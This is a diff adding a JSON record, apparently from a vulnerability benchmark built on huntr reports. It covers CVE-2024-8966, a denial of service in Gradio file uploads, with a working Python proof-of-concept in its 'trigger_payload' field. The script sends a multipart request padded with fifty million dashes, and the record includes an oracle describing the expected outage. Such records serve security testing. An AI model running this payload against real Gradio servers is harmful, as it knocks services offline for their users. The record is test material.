@@ -1,0 +1,15 @@
+{
+  "file_id": "226_gradio_huntr_7b5932bb-58d1-4e71-b85c-43dc40522ff2",
+  "numeric_id": "226",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Denial of Service caused by excessive characters appended to multipart boundary in Gradio file upload",
+  "cve": "CVE-2024-8966",
+  "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling",
+  "library": "gradio",
+  "affected_version": "< 5.23",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "import requests\n# Configuration\nnum = 50000000\nurl = \"http://127.0.0.1:7860/login\"\nheaders = {\n\"Content-Type\": \"multipart/form-data; boundary=---------------------------28417809174060210578\"\n}\n# The exact raw payload as specified\ndata = (\n\"-----------------------------284178091740602105783377960069\\r\\n\"\n\"Content-Disposition: form-data; name=\\\"uploadFile\\\"; filename=\\\"test.txt\\\"\\r\\n\"\n\"Content-Type: text/plain\\r\\n\\r\\n\"\n\"Hello I am test\\r\\n\"\n\"-----------------------------284178091740602105783377960069--\" + '-' * num + \"\\r\\n\"\n)\nresponse = requests.post(url, headers=headers, data=data.encode('utf-8'), verify=False)\n# Print response status code\nprint(response.status_code)",
+  "oracle": "Gradio application becomes unavailable for extended periods due to excessive processing of characters appended to the multipart boundary"
+}
